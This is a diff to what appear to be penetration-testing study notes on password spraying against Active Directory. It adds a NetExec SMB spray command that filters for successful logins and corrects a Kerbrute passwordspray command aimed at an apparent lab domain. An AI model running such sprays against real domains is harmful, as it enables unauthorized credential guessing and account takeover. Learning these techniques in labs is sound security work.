@@ -31,7 +31,13 @@ Get-DomainPolicy
 
 After that, we can start attempting to actually perform password spray:
 
+-Using NetExec for password spraying:
+```
+sudo nxc smb <dcip> -u <userlist> -p <password> | grep +
+#grep + only show sucess result
+```
+
 -Using Kerbrute for password spraying:
 ```
-kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 <userli  Welcome1
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 <userlist> <password>
 ```
